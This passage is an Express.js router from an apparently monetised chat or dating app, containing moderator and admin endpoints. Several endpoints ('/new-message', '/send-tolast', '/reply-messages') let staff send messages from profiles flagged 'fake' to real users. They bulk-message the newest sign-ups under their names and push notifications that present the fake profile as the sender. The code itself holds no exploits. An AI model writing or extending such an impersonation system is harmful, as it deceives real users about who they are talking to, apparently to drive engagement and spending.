        Notification.countDocuments({}).then(result => {
            let count = result
            let page = Math.floor(count / limit);
            let response = {
                limit: Number(limit),
                totalElements: count,
                totalPages: page
            }
            res.status(200).send(response)
        })

    } catch (e) {
        res.status(500).send(e);
    }
})

router.post('/new-message', modAuth, async (req, res) => {

    let rawDialog = req.body.dialog
    let rawMessage = req.body.message
    let systemMessage = req.body.systemMessage
    let coinMessage = req.body.coinMessage
    let rawImage = req.body.image
    try {
        const dialog = await MessageDialog.findById(rawDialog).populate("user1").populate("user2")
        if (dialog) {
            var receiver = null
            var sender = null
            if (dialog.user1.fake) {
                sender = dialog.user1._id
                receiver = dialog.user2._id
            } else {
                sender = dialog.user2._id
                receiver = dialog.user1._id
            }

            const message = new Message({
                message: rawMessage,
                sender: sender,
                receiver: receiver,
                image: null,
                dialog: dialog._id,
                createdAt: new Date()
            })
            if (systemMessage) {
                message.systemMessage = true
            }

            if (coinMessage) {
                message.coinMessage = true
            }

            if (rawImage != null) {
                message.image = rawImage
            }
            dialog.lastMessage = message._id;
            dialog.lastFake = true
            await dialog.save();
            await message.save();
            sendNotif(receiver, message)
            sendNewMessageToSocket(req, message)
            res.status(200).send(message);
        } else {
            if (rawMessage.message != null) {
                let user = rawMessage.sender
                let profile = rawMessage.receiver
                const dialog = await MessageDialog.findOne({ $or: [{ user1: user, user2: profile }, { user1: profile, user2: user }] })

                if (dialog) {
                    var message = new Message({
                        message: rawMessage.message,
                        sender: user,
                        receiver: profile,
                        dialog: dialog._id,
                        createdAt: new Date()
                    })

                    if (systemMessage) {
                        message.systemMessage = true
                    }

                    if (coinMessage) {
                        message.coinMessage = true
                    }

                    await message.save();
                    dialog.lastMessage = message._id;
                    dialog.lastFake = true
                    await dialog.save();
                    sendNotif(profile, message)
                    sendNewMessageToSocket(req, message)
                    res.status(200).send(message);
                } else {
                    var message = new Message({
                        message: rawMessage.message,
                        sender: rawMessage.sender,
                        receiver: rawMessage.receiver,
                        dialog: null,
                        createdAt: new Date()
                    })

                    if (systemMessage) {
                        message.systemMessage = true
                    }

                    if (coinMessage) {
                        message.coinMessage = true
                    }

                    const newDialog = new MessageDialog({
                        user1: message.sender,
                        user2: message.receiver,
                        lastMessage: message._id
                    })
                    newDialog.lastFake = true
                    await newDialog.save();
                    message.dialog = newDialog._id
                    await message.save();
                    sendNotif(message.receiver, message)
                    sendNewMessageToSocket(req, message)
                    res.status(200).send(message);
                }
            }
        }
    } catch (e) {
        console.log(e);
        res.status(400).send(e);
    }
})

router.get('/get-profile', modAuth, async (req, res) => {
    try {
        let profile = await User.findById(req.query._id)
        res.status(200).send(profile)
    } catch (e) {
        res.status(500).send(e);
    }
})

router.get('/get-hobby', adminAuth, async (req, res) => {
    try {
        let hobby = await Hobby.findById(req.query._id)
        res.status(200).send(hobby)
    } catch (e) {
        res.status(500).send(e);
    }
})

router.get('/get-template', adminAuth, async (req, res) => {
    try {
        let hobby = await MessageTemplate.findById(req.query._id)
        res.status(200).send(hobby)
    } catch (e) {
        res.status(500).send(e);
    }
})

router.get('/get-package', adminAuth, async (req, res) => {
    try {
        let package = await Package.findById(req.query._id)
        res.status(200).send(package)
    } catch (e) {
        res.status(500).send(e);
    }
})

router.get('/get-slider', adminAuth, async (req, res) => {
    try {
        let slider = await Slider.findById(req.query._id)
        res.status(200).send(slider)
    } catch (e) {
        res.status(500).send(e);
    }
})

router.get('/get-vip-slider', adminAuth, async (req, res) => {
    try {
        let slider = await VipSlider.findById(req.query._id)
        res.status(200).send(slider)
    } catch (e) {
        res.status(500).send(e);
    }
})

router.get('/get-gift', adminAuth, async (req, res) => {
    try {
        let gift = await Gift.findById(req.query._id)
        res.status(200).send(gift)
    } catch (e) {
        res.status(500).send(e);
    }
})


router.delete('/delete-profile', adminAuth, async (req, res) => {
    try {
        let profile = await User.findByIdAndDelete(req.query._id)
        res.status(200).send(profile)
    } catch (e) {
        res.status(500).send(e);
    }
})

router.delete('/delete-hobby', adminAuth, async (req, res) => {
    try {
        let hobby = await Hobby.findByIdAndDelete(req.query._id)
        res.status(200).send(hobby)
    } catch (e) {
        res.status(500).send(e);
    }
})


router.delete('/delete-template', adminAuth, async (req, res) => {
    try {
        let hobby = await MessageTemplate.findByIdAndDelete(req.query._id)
        res.status(200).send(hobby)
    } catch (e) {
        res.status(500).send(e);
    }
})

router.delete('/delete-package', adminAuth, async (req, res) => {
    try {
        let package = await Package.findByIdAndDelete(req.query._id)
        res.status(200).send(package)
    } catch (e) {
        res.status(500).send(e);
    }
})

router.delete('/delete-slider', adminAuth, async (req, res) => {
    try {
        let slider = await Slider.findByIdAndDelete(req.query._id)
        res.status(200).send(slider)
    } catch (e) {
        res.status(500).send(e);
    }
})

router.delete('/delete-vip-slider', adminAuth, async (req, res) => {
    try {
        let slider = await VipSlider.findByIdAndDelete(req.query._id)
        res.status(200).send(slider)
    } catch (e) {
        res.status(500).send(e);
    }
})

router.delete('/delete-gift', adminAuth, async (req, res) => {
    try {
        let gift = await Gift.findByIdAndDelete(req.query._id)
        res.status(200).send(gift)
    } catch (e) {
        res.status(500).send(e);
    }
})

router.delete('/delete-message', adminAuth, async (req, res) => {
    try {
        let message = await Message.findById(req.query._id)
        let dialog = await MessageDialog.findById(message.dialog)
        if (dialog) {
            if (dialog.lastMessage.toString() == message._id.toString()) {
                let lastMessage = await Message.findOne({ dialog: dialog._id, _id: { $ne: message._id } }).sort({ createdAt: -1 })
                if (lastMessage) {
                    dialog.lastMessage = lastMessage._id
                    await dialog.save()
                }
            }
        }
        await message.remove()
        res.status(200).send(message)
    } catch (e) {
        res.status(500)
    }
})

router.delete('/delete-dialog', modAuth, async (req, res) => {
    try {
        let dialog = await MessageDialog.findByIdAndDelete(req
            .query._id)
        let messages = await Message.deleteMany({ dialog: dialog._id })
        res.status(200).send({ dialog, messages })
    } catch (e) {
        console.log(e);
        res.status(500)
    }
})

router.post('/send-notif', modAuth, async (req, res) => {

    try {
        let body = req.body
        let user = body.user
        //  console.log(body);
        if (user == "all") {
            sendNotification.sendNotificationToAll({ title: body.name, desc: body.desc })
            res.send({ message: "Notification sent" })
        } else {
            let userObj = await User.findById(user, { ftoken: true })
            if (userObj != null && userObj.ftoken != null) {
                sendNotification.sendNotification({ title: body.name, message: body.desc, ftoken: userObj.ftoken })
                res.send({ message: "Notification sent" })
            } else {
                res.status(400).send({ error: "User not found" })
            }
        }
    } catch (e) {
        console.log(e);
        res.status(500).send(e);
    }
})


router.post('/send-tolast', modAuth, async (req, res) => {

    try {
        var query = { admin: { $ne: true }, fake: { $ne: true } }
        let users = await User.find(query, userProject).sort({ createdAt: -1 }).limit(100)
        users.forEach(async user => {
            sendMessage(req, user, req.body.text)
        })
        res.send({ message: "Messages sent" })
    } catch (e) {
        console.log(e);
        res.status(500).send(e);
    }
})

router.post('/reply-messages', modAuth, async (req, res) => {
    try {
        let dialogs = await MessageDialog.find({ lastFake: true }).limit(10)
        .populate("user1").
        populate("user2")
        replyMessages(req,dialogs,req.body.text)
        res.send({ message: "Messages sent" })
    } catch (e) {
        console.log(e);
        res.status(500).send(e);
    }
})

async function sendMessage(req, user, text) {
    try {
        var users = await User.find({ fake: true })
        let random = Math.floor(Math.random() * users.length)
        let sender = users[random]
        let receiver = user


        let nameTag = "{{name}}"
        let messageText = text
        
        //if messageText has name tag
        if (messageText.includes(nameTag)){
            let name = receiver.name
            messageText = messageText.replace(nameTag,name)
        }

        let message = new Message({
            message: messageText,
            sender: sender,
            receiver: receiver._id,
            createdAt: new Date()
        })

        

        let oldDialog = await MessageDialog.findOne(
            {
                $or: [
                    { user1: sender, user2: receiver._id },
                    { user1: receiver._id, user2: sender }
                ]
            }
        )

        let dialog = null

        if (oldDialog) {
            dialog = oldDialog
        }else{
            dialog = new MessageDialog({
                user1: sender,
                user2: receiver._id,
                lastMessage: message._id,
                lastFake: true
            })
        }

        dialog.lastFake = true
        await dialog.save();
        message.dialog = dialog._id
        await message.save()
        sendNotif(receiver, message)
        sendNewMessageToSocket(req, message)
    } catch (error) {
        console.log(error);
    }
}

async function replyMessages(req,dialogs, text) {
    try {
        for (let i = 0; i < dialogs.length; i++) {
            const dialog = dialogs[i];
            var sender = dialog.user1._id
            var receiver = dialog.user2._id
            if (dialog.user1.fake) {
                sender = dialog.user1._id
                receiver = dialog.user2._id
            }else{
                sender = dialog.user2._id
                receiver = dialog.user1._id
            }

            let message = new Message({
                message: text,
                sender: sender,
                receiver: receiver,
                dialog:dialog._id,
                createdAt: new Date()
            })
            dialog.lastFake = true
            await dialog.save();
            message.dialog = dialog._id
            await message.save()
            sendNotif(receiver, message)
            sendNewMessageToSocket(req, message)
        }     
    } catch (error) {
        console.log(error);
    }
}

async function sendNotif(receiver, message) {
    try {
        let receiverObj = await User.findById(receiver, { ftoken: 1, online: 1 })
        let senderObj = await User.findById(message.sender, { name: 1 })

        // if (receiverObj.online) {
        //     return
        // }

        if (receiverObj == null) {
            return
        }
        if (receiverObj.ftoken == null) {
            return
        }
        if (receiverObj.ftoken == "") {
            return
        }
        if (senderObj == null) {
            return
        }
        if (senderObj.name == null) {
            return
        }

        var sendderText = "Yeni Mesaj Geldi"
        if (message.systemMessage) {
            sendderText = "Sistemden bir mesaj aldın."
        }
        if (message.coinMessage != null) {
            sendderText = "Sistemden bir mesaj aldın."
        }
        let text = senderObj.name + " sana bir mesaj gönderdi."
        sendNotification.sendNotification({
            title: "Yeni Mesaj Geldi",
            message: text,
            ftoken: receiverObj.ftoken
        })
    } catch (error) {
        console.log(error);
    }

}

function sendNewMessageToSocket(req, message) {
    let io = req.app.get('socketio');
    let receiver = message.receiver.toString()
    io.to(receiver).emit('dialog/new-message', message);
    io.to(receiver).emit('new-message', message);
}

module.exports = router;